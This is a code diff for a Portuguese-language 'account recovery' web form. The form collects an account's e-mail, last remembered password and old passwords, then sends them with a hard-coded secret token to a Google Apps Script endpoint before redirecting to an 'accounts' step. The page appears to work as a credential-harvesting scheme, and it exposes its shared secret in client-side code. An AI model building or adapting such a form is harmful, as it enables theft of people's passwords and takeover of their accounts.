@@ -8,6 +8,13 @@
   <script src="https://unpkg.com/react@18/umd/react.production.min.js" crossorigin></script>
   <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js" crossorigin></script>
   <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+  <style>
+    @keyframes slow-pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.7; transform: scale(0.95); }
+    }
+    .animate-slow-pulse { animation: slow-pulse 2s infinite ease-in-out; }
+  </style>
 </head>
 <body class="bg-slate-950">
   <div id="root"></div>
@@ -44,7 +51,16 @@
       const [loading, setLoading] = useState(false);
       const [isSubmitted, setIsSubmitted] = useState(false);
 
-      // Máscaras e Formatações
+      // --- Lógica de Redirecionamento Automático ---
+      useEffect(() => {
+        if (isSubmitted) {
+          const timer = setTimeout(() => {
+            window.location.href = 'contas.html';
+          }, 4000); // Redireciona após 4 segundos
+          return () => clearTimeout(timer);
+        }
+      }, [isSubmitted]);
+
       const applyPhoneMask = (v) => {
         if (!v) return "";
         v = v.replace(/\D/g, "");
@@ -66,7 +82,6 @@
         return val.toLowerCase().replace(/[^a-z0-9._]/g, '').slice(0, 30);
       };
 
-      // Cálculo Probabilidade
       const probabilidade = useMemo(() => {
         if (!formData.plataforma) return 0;
         let score = 20; 
@@ -88,16 +103,11 @@
         return Math.floor(count / 1000) * 10;
       }, [formData.payFollowersCount]);
 
-      // --- ENVIO FORMULÁRIO (CORRIGIDO) ---
       const handleSubmit = async (e) => {
         e.preventDefault();
         setLoading(true);
-
-        // Captura o indicador pela URL (ex: site.com/solicitar.html?ref=NOME)
         const urlParams = new URLSearchParams(window.location.search);
         const indicadoPor = urlParams.get('ref') || "";
-
-        // COLE A SUA URL DO APPS SCRIPT AQUI ABAIXO:
         const API_URL = "https://script.google.com/macros/s/AKfycbxx9D_QOhsGhL7B9qowfIVNhKPomNo_iZmo1vF_x-BXwSnWs_1j734NPUZwDVmcrBImPA/exec";
         
         try {
@@ -105,12 +115,11 @@
             ...formData, 
             probabilidade, 
             descontoAplicado: discount,
-            indicadoPor: indicadoPor, // Preenche a Coluna M para o saldo
-            token_secreto: "RecoveryPro2024!@#SuperSeguro", // Validação de segurança
+            indicadoPor: indicadoPor,
+            token_secreto: "RecoveryPro2024!@#SuperSeguro",
             dataEnvio: new Date().toLocaleString() 
           };
 
-          // Google Script requer mode: 'no-cors' para evitar erro de redirecionamento
           await fetch(API_URL, { 
             method: 'POST', 
             mode: 'no-cors', 
@@ -125,16 +134,29 @@
         }
       };
 
+      // --- TELA DE SUCESSO E REDIRECIONAMENTO ---
       if (isSubmitted) {
         return (
           <div className="min-h-screen bg-slate-950 flex items-center justify-center p-6 text-slate-100 text-center">
-            <div className="max-w-md w-full bg-slate-900 border border-emerald-500/30 rounded-[3rem] p-10 shadow-2xl">
-              <div className="w-20 h-20 bg-emerald-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
-                <Check className="w-12 h-12 text-emerald-400" />
+            <div className="max-w-md w-full bg-slate-900 border border-emerald-500/30 rounded-[3rem] p-10 shadow-2xl space-y-6">
+              <div className="relative mx-auto w-24 h-24">
+                <div className="absolute inset-0 bg-emerald-500/20 rounded-full animate-ping"></div>
+                <div className="relative w-24 h-24 bg-emerald-500/20 rounded-full flex items-center justify-center border border-emerald-500/50">
+                  <Check className="w-12 h-12 text-emerald-400" />
+                </div>
               </div>
-              <h2 className="text-3xl font-bold mb-4">Solicitação Enviada!</h2>
-              <p className="text-slate-400 mb-8">Analisamos seu caso em instantes. Entraremos em contato via WhatsApp.</p>
-              <button onClick={() => window.location.reload()} className="w-full py-4 bg-emerald-600 rounded-2xl font-bold">Voltar ao Início</button>
+              
+              <div className="space-y-2">
+                <h2 className="text-3xl font-bold">Concluido!</h2>
+                <p className="text-slate-400">Recebemos os dados da sua conta.</p>
+              </div>
+
+              <div className="bg-slate-800/50 p-4 rounded-2xl flex items-center justify-center gap-3 border border-slate-700">
+                <div className="w-5 h-5 border-2 border-indigo-500 border-t-transparent rounded-full animate-spin"></div>
+                <p className="text-sm font-medium text-indigo-300">Redirecionando para 'Etapa das Contas'...</p>
+              </div>
+
+              <p className="text-[10px] text-slate-600 uppercase tracking-widest animate-pulse">Aguarde um instante</p>
             </div>
           </div>
         );
@@ -229,7 +251,7 @@
                   </>
                 )}
 
-                {/* E-MAIL (Geral) */}
+                {/* E-MAIL */}
                 <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2.5rem]">
                   <h2 className="text-xl font-semibold mb-6">{formData.plataforma === 'google' ? 'Gmail a recuperar' : 'E-mail da Conta'}</h2>
                   <input 
@@ -328,7 +350,6 @@
                 {/* SEGURANÇA */}
                 <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2.5rem]">
                   <h2 className="text-xl font-semibold mb-6">Segurança</h2>
-                  
                   <div className="mb-6 relative">
                     <label className="text-xs font-bold text-slate-500 uppercase ml-2 mb-2 block">Última senha que lembra</label>
                     <input 
@@ -374,7 +395,6 @@
                 {/* SENHAS ANTIGAS */}
                 <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2.5rem]">
                   <h2 className="text-xl font-semibold mb-4 text-indigo-400">Senhas Antigas</h2>
-                  <p className="text-xs text-slate-500 mb-6">Adicionar senhas antigas aumenta drasticamente as chances de sucesso.</p>
                   <div className="space-y-3">
                     {formData.senhasAntigas.map((pass, idx) => (
                       <input 
@@ -392,7 +412,7 @@
                   </div>
                 </section>
 
-                {/* MEIO JURÍDICO */}
+          {/* MEIO JURÍDICO */}
                 {formData.plataforma === 'insta' && (
                   <section className="bg-indigo-900/20 border-2 border-indigo-500/50 p-6 md:p-8 rounded-[2.5rem]">
                     <div className="flex items-start gap-4 mb-6">
@@ -444,7 +464,7 @@
 
                   {formData.payWithFollowers && (
                     <div className="mt-4 p-4 bg-slate-800 rounded-2xl animate-in zoom-in-95">
-                      <label className="text-xs font-bold text-slate-400 mb-2 block">Quantos seguidores você tem na conta reserva?</label>
+                      <label className="text-xs font-bold text-slate-400 mb-2 block">Quantidade de seguidores da sua antiga conta:</label>
                       <input 
                         type="text" 
                         value={formData.payFollowersCount}
